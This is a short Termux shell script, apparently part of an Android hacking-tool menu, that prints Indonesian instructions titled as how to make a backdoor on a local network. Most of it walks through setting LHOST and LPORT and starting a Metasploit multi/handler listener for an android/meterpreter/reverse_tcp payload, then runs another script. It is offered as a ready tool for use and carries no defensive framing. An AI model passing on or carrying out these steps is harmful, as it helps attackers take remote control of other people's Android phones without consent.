blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
clear
sleep 2
figlet INFO | lolcat
echo '
##Cara Buat Backdoor Dalam 1 Jaringan##
LHOST [Pakai Inet] dan cara cek Inet kamu tinggal ketik ifconfig
contoh LHOST 127.0.0.1
LPORT [ Kode ] Pada saat menjalankan metasploitnya LHOST sama LPORT harus di Samain host dan portnya
contoh LPORT 8080'

echo '
Ketik msfconsole Untuk menjalankan metasploitnya
Pada saat udah jalan metasploit, tinggal ketik

use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 192.***/10.9.****
set LPORT 8080/8888/4444
run

' | lolcat
read -p "Kembali " ex
clear
cd /data/data/com.termux/files/home/Metas/
sh run.sh
